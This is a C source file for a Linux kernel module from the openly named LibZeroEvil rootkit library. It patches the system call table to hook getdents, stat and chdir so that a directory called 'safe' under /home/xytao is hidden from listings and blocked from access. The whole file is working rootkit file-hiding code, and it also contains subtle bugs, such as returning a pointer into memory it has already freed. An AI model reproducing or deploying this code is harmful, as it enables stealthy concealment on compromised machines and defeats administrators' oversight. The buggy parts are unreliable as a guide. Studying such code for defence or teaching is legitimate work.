// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# include <linux/module.h>
# include <linux/kernel.h>
// linux_dirent64.
# include <linux/dirent.h>
# include <linux/dcache.h>
# include <linux/fdtable.h>
# include <linux/syscalls.h>
# include <linux/fs_struct.h>
# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define SECRET_FILE "safe"

unsigned long **sct;

asmlinkage long
(*real_getdents)(unsigned int fd,
                 struct linux_dirent __user *dirent,
                 unsigned int count);
asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count);

asmlinkage long
(*real_getdents64)(unsigned int fd,
                   struct linux_dirent64 __user *dirent,
                   unsigned int count);
asmlinkage long
fake_getdents64(unsigned int fd,
                struct linux_dirent64 __user *dirent,
                unsigned int count);
asmlinkage long fake_stat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
asmlinkage long (*real_stat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);

asmlinkage long fake_chdir(const char __user *filename);
asmlinkage long (*real_chdir)(const char __user *filename);

char *get_filename(struct file *file);

char *get_filename(struct file *file)
{
    char *buf = (char *)__get_free_page(GFP_KERNEL);
    if (!buf)
    {
        return NULL;
    }
    char *filename = dentry_path_raw(file->f_path.dentry, buf, PAGE_SIZE - 1);
    if (IS_ERR(filename))
    {
        free_page((unsigned long)buf);
        return NULL;
    }
    free_page((unsigned long)buf);
    return filename;

}

int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    /* No consideration on failure. */
    sct = get_sct();

    disable_wp();
    HOOK_SCT(sct, getdents);
    HOOK_SCT(sct, stat);
    HOOK_SCT(sct, chdir);
    //HOOK_SCT(sct, getdents64);
    enable_wp();

    return 0;
}


void
cleanup_module(void)
{
    disable_wp();
    UNHOOK_SCT(sct, getdents);

    UNHOOK_SCT(sct, stat);
    UNHOOK_SCT(sct, chdir);
    enable_wp();

    fm_alert("%s\n", "Farewell the World!");

    return;
}
bool is_absolute(const char __user *str){
   return str && str[0]=='/';

}
asmlinkage long fake_chdir(const char __user *filename){
    struct path pwd;
    get_fs_pwd(current->fs, &pwd);
    char x[PATH_MAX];
    char *p = dentry_path_raw(pwd.dentry, x, PATH_MAX - 1);
    fm_alert("pwd:%s/%s\n", p,filename);

if (!strncmp(filename,"/home/xytao/safe",16))
    {   fm_alert("chdir:%s\n", filename);
        return -2;
    }
    return real_chdir(filename);
}
asmlinkage long fake_stat(const char __user *filename, struct __old_kernel_stat __user *statbuf)
{
    if (!strncmp(filename,"/home/xytao/safe",16))
    {
        return -2;
    }
    return real_stat(filename,statbuf);
}
long
remove(char *name, struct linux_dirent *dirp, long total)
{   printk("111: %d\n", total);
    struct linux_dirent *cur;
    long index = 0;
    while (index < total) {
        cur = (struct linux_dirent *)((unsigned long)dirp + index);
        printk("name:%s",cur->d_name);
        index += cur->d_reclen;
    }

    return total;
}

asmlinkage long
fake_getdents(unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count)
{
    struct file *file;
    struct path *path;
    struct files_struct *files = current->files;
    spin_lock(&files->file_lock);
    file = fcheck_files(files, fd);
    if (!file)
    {
        spin_unlock(&files->file_lock);
        return -ENOENT;
    }
    spin_unlock(&files->file_lock);
    char *pathname=get_filename(file);
    //fm_alert("%s\n", pathname);

    long ret;
    ret = real_getdents(fd, dirent, count);

    if (!strncmp(pathname,"/home/xytao",10))
        ret = remove_dent(SECRET_FILE, dirent, ret);

    //print_dents(dirent, ret);
    //print_dents(dirent, ret);

    return ret;
}


// INFO: It was triggered on a Kali i686-pae installation.
asmlinkage long
fake_getdents64(unsigned int fd,
                struct linux_dirent64 __user *dirent,
                unsigned int count)
{
    long ret;

    ret = real_getdents64(fd, dirent, count);

    //print_dents64(dirent, ret);
    ret = remove_dent64(SECRET_FILE, dirent, ret);
    //print_dents64(dirent, ret);

    return ret;
}